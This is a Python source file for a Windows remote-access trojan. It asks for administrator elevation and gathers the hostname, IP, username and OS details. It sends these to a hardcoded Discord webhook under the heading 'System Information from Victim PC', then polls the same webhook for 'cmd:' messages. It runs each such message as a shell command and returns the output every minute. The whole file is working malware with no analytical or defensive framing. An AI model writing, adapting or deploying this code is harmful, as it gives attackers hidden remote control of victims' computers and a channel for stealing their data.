import os
import platform
import socket
import time
import requests
import subprocess
import ctypes
import sys
import json
try:
    import win32com.shell.shell as shell
    admin_enabled = True
except ImportError:
    admin_enabled = False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        except Exception as e:
            return f"Failed to elevate to admin: {str(e)}"
    return "Running with admin privileges"

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = os.getlogin()
        os_name = platform.system()
        os_version = platform.version()
        admin_status = "Yes" if is_admin() else "No"
        return {
            "hostname": hostname,
            "ip_address": ip_address,
            "username": username,
            "os_name": os_name,
            "os_version": os_version,
            "admin_status": admin_status,
            "note": "Tokens for Steam, Discord, Roblox, and Telegram cannot be accessed without authentication. Remote control enabled via webhook commands."
        }
    except Exception as e:
        return {"error": f"Failed to collect system info: {str(e)}"}

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return {"command": command, "output": result.stdout, "error": result.stderr}
    except Exception as e:
        return {"command": command, "error": str(e)}

def fetch_commands(webhook_url):
    try:
        response = requests.get(webhook_url)
        if response.status_code == 200:
            messages = response.json()
            if isinstance(messages, list) and messages:
                last_message = messages[0].get("content", "")
                if last_message.startswith("cmd:"):
                    return last_message[4:].strip()
        return None
    except Exception:
        return None

def send_to_webhook(data, webhook_url):
    payload = {
        "content": "System Information from Victim PC",
        "embeds": [{
            "title": "System Info",
            "color": 16711680,
            "description": "\n".join(f"{key}: {value}" for key, value in data.items())
        }]
    }
    try:
        response = requests.post(webhook_url, json=payload)
        return response.status_code in (200, 204)
    except Exception as e:
        return f"Failed to send to webhook: {str(e)}"

def main():
    webhook_url = "https://discord.com/api/webhooks/1394677813579350068/E4YNqaYjcuiGMfM16KxH8MVHPp6Kh9zc76CgZo6e6rfUM_PA2oDhDNa5Z_RdvQhiF2sy"
    
    # Request admin privileges
    if admin_enabled:
        elevation_result = run_as_admin()
        if "Failed" in elevation_result:
            send_to_webhook({"error": elevation_result}, webhook_url)
    
    while True:
        # Collect and send system info
        info = get_system_info()
        send_to_webhook(info, webhook_url)
        
        # Check for commands (remote control)
        command = fetch_commands(webhook_url)
        if command:
            result = execute_command(command)
            send_to_webhook(result, webhook_url)
        
        time.sleep(60)

if __name__ == "__main__":
    main()